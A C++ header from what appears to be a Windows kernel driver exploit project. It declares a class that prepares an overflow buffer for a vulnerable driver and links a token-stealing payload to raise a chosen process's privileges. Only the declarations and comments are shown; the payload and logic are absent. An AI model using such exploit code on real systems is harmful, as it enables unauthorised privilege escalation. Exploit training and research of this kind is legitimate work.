#ifndef PAYLOAD_STACK_OVERFLOW
#define PAYLOAD_STACK_OVERFLOW

#include <windows.h>
#include <tlhelp32.h>  // CreateToolhelp32Snapshot

#include "payload_x64.h" // TokenStealingPayloadWin10

#include "iostream" // cout

using namespace std;

namespace payload_stack_overflow {

	/* prepare input buffer to send to vulnerable driver via CTL CODE */
	class PayloadStackOverFlow {

	public:
		byte* _buffer; // input buffer with payload
		const DWORD _bufferSz = 2080; // // input buffer size

		PayloadStackOverFlow(DWORD pid) {
			_buffer = 0;
			_targetPid = pid;
			_funcAddr = 0;
			_pidOffset = 0;
		}

		~PayloadStackOverFlow() {
			deinit();
			_buffer = 0;
			_targetPid = 0;
			_funcAddr = 0;
			_pidOffset = 0;
		}
		
		/* allocate a buffer, link the payload and set the PID */
		bool init();

	private:
		DWORD _targetPid; // process 'PID' which is needed to escalate privileges
		byte* _funcAddr; // we calculate 'func_addr' via disassembling instruction JMP ADDR
		DWORD _pidOffset; // we calculate 'pid_offset' via searching 'g_bDefaultPid' signature

		/* deallocate a buffer */
		void deinit();
		
		/* check if a process with PID is running */
		bool process_is_running();

		/* set memory permission for '_funcAddr' memory*/
		bool set_memory_permission(DWORD flNewProtect);

		/* write '_targetPid' into the payload */
		bool set_pid_to_payload();
	};

}


#endif // ifndef PAYLOAD_STACK_OVERFLOW
